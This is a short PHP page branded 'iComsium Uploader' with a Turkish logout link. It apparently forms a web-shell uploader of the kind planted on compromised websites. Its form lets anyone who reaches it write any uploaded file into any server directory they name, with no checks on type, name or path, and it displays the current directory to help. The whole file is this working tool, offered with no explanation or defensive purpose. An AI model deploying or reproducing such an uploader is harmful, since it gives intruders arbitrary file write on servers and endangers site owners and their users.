<h2>iComsium</h2><p><a href='?logout=1'>Çıkış Yap</a></p><?php
// Get the current directory where the file is located
$currentDir = getcwd();

if (isset($_POST['submit'])) {
    $destinationDir = $_POST['destination']; // Destination folder
    $uploadFile = $_FILES['file']; // Uploaded file

    // Check if destination directory exists
    if (!is_dir($destinationDir)) {
        echo "The destination directory does not exist.";
        exit;
    }

    // Full file path
    $targetFile = $destinationDir . DIRECTORY_SEPARATOR . basename($uploadFile['name']);

    // Upload the file
    if (move_uploaded_file($uploadFile['tmp_name'], $targetFile)) {
        echo "File successfully uploaded to: " . $targetFile;
    } else {
        echo "Error uploading file.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iComsium Uploader</title>
</head>
<body>
    <form method="POST" enctype="multipart/form-data">
        <label for="destination">Destination Directory:</label>
        <input type="text" id="destination" name="destination" value="<?php echo $currentDir; ?>" style="width: 400px;" required>
        <br>
        <label for="file">Choose a File:</label>
        <input type="file" id="file" name="file" required>
        <br>
        <button type="submit" name="submit">Upload</button>
    </form>
</body>
</html>